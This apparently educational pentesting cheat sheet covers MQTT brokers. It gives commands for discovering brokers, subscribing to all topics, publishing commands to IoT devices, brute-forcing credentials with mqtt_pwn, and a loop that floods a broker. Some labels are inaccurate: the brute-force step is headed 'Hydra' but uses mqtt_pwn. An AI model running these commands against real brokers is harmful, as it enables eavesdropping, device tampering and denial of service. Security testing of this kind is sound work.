# MQTT

## **Theory**

MQTT (Message Queuing Telemetry Transport) is a lightweight, publish-subscribe network protocol designed for IoT (Internet of Things) devices. It enables low-bandwidth, real-time communication between clients and a broker. MQTT is widely used in IoT applications, such as smart home systems, health monitors, and industrial automation.

Pentesters often target MQTT brokers to exploit weaknesses in authentication, authorization, encryption, and message integrity, as these systems may expose sensitive data or allow attackers to manipulate device behavior.

## **Requirements**

1. Hardware
   * Laptop or PC to run pentesting tools.
   * Access to MQTT broker/IoT device network for testing.
2. Software
   * mosquitto\_pub and mosquitto\_sub (MQTT client utilities for publishing/subscribing messages).
   * MQTT-Explorer (GUI tool for analyzing MQTT topics and messages).
   * Wireshark (for network packet analysis).
   * Nmap (for discovering MQTT services).
   * Burp Suite (for traffic manipulation, useful if MQTT uses web interfaces or APIs).

## **Cheat Sheet**

```bash
# Discover MQTT Broker
nmap -p 1883,8883 -sV <target_ip>

# Subscribe to all topics (listen for messages)
mosquitto_sub -h <broker_ip> -p 1883 -t "#" -v

# Publish a message to control an IoT device
mosquitto_pub -h <broker_ip> -p 1883 -t "home/lights" -m "off"

# Brute-force MQTT broker credentials with mqtt_pwn
~/mqtt_pwn ⇒ python run.py  # Start mqtt_pwn
localhost:1883 >> bruteforce --help

# Capture unencrypted MQTT traffic (use with Wireshark)
tcp.port == 1883

# Denial-of-Service (DoS) Attack on MQTT Broker
while true; do
  mosquitto_pub -h <broker_ip> -p 1883 -t "spam/topic" -m "junk data";
done
```

## **Common Attacks**

1.  Discovering MQTT Broker

    * MQTT brokers typically listen on TCP port 1883 (unencrypted) or 8883 (TLS/SSL). The first step in pentesting an MQTT environment is identifying the broker and verifying if it is publicly&#x20;

    Command Example (Discovering MQTT Broker via Nmap):

    ```bash
    nmap -p 1883,8883 -sV <target_ip>
    ```

    This scans for open MQTT ports on the target IP and reports service details.
2.  Subscribing to MQTT Topics

    * Once the broker is identified, you can subscribe to topics and listen for messages. If the broker allows anonymous access or lacks proper authentication, an attacker can monitor sensitive data being transmitted between IoT devices.

    Command Example (Subscribing to All Topics):

    ```bash
    mosquitto_sub -h <broker_ip> -p 1883 -t "#" -v
    ```

    This subscribes to all topics (`#` is a wildcard) on the broker, displaying message content in real time.
3.  Publishing Malicious Messages

    * Attackers can publish malicious commands to control IoT devices if the broker has weak or no authorization mechanisms. For example, you could control a smart home device by publishing messages on its control topics.

    Command Example (Publishing a Message to a Topic):

    <pre class="language-bash"><code class="lang-bash"><strong>mosquitto_pub -h &#x3C;broker_ip> -p 1883 -t "home/lights" -m "off"
    </strong></code></pre>

    This command publishes the message `off` to the `home/lights` topic, potentially turning off the smart lights.
4.  Brute-Forcing MQTT Credentials

    * Some MQTT brokers require authentication, but weak credentials can often be brute-forced. By using common username/password combinations, an attacker might gain access to the broker.

    Command Example (Brute-Forcing MQTT Credentials with Hydra):

    ```bash
    ~/mqtt_pwn ⇒ python run.py #start mqtt_pwn
    localhost:1883 >> bruteforce --help
    usage: bruteforce [-h] [-u USERNAME [USERNAME ...] | -uf USERNAMES_FILE]
                      [-p PASSWORD [PASSWORD ...] | -pf PASSWORDS_FILE]
    ```
5.  Exploiting Insecure MQTT Connections (Man-in-the-Middle Attack)

    * If the broker uses unencrypted connections (on port 1883), you can perform a man-in-the-middle (MITM) attack by capturing MQTT traffic and injecting commands or stealing data.

    Command Example (Wireshark Capture Filter for MQTT Traffic):

    ```bash
    tcp.port == 1883
    ```

    This captures unencrypted MQTT traffic, allowing you to inspect and manipulate messages.
6.  Denial of Service (DoS) Attack on MQTT Broker

    * Flooding the broker with excessive publish/subscribe requests can overwhelm it, causing a denial-of-service (DoS) and preventing legitimate devices from communicating.

    Command Example (Flooding MQTT Topics with Junk Data):

    ```bash
    while true; do
      mosquitto_pub -h <broker_ip> -p 1883 -t "spam/topic" -m "junk data";
    done
    ```

    This loop repeatedly publishes junk data to overwhelm the broker.

## **Resources**

* [1883 - Pentesting MQTT (Mosquitto)](https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto)
* [Credentials Brute Force ](https://mqtt-pwn.readthedocs.io/en/latest/plugins/brute.html)
* [IoT Pentesting 101: How to Hack MQTT – The Standard for IoT Messaging](https://securitycafe.ro/2022/04/08/iot-pentesting-101-how-to-hack-mqtt-the-standard-for-iot-messaging/)
